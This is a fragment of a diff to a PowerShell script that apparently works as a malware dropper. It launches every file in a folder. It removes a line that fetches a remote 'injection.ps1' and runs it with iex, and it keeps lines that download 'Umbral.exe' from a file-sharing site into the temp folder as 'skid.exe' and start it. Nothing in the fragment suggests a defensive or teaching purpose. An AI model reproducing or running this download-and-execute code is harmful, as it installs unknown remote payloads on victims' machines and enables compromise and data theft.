@@ -27,7 +27,6 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
     Start-Process -FilePath $_.FullName
 }
 
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/injection.ps1" -useb)
 
 Invoke-WebRequest -Uri "https://anonsharing.com/file/c24bdc0c7b314dfd/Umbral.exe" -OutFile "$temp\skid.exe"
 Start-Process -FilePath "$temp\skid.exe"
